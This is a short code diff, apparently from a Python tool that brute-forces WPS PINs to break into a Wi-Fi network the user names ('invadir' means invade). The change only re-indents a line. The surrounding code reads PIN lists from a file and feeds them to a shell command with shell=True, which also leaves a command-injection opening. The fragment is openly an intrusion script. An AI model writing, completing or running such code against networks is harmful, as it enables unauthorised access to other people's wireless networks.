@@ -49,7 +49,7 @@ print(ciano+"Qual o nome da rede que deseja invadir? ")
 ssid = input(ciano+"["+magenta+"~"+ciano+"] "+magenta)
 while True:
     with open("p1.txt", "r") as file:
-    pin1 = file.readlines()
+        pin1 = file.readlines()
     def test_wps_pin(pin1):
         command = f"wps_pin.py -p {pin1}"
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
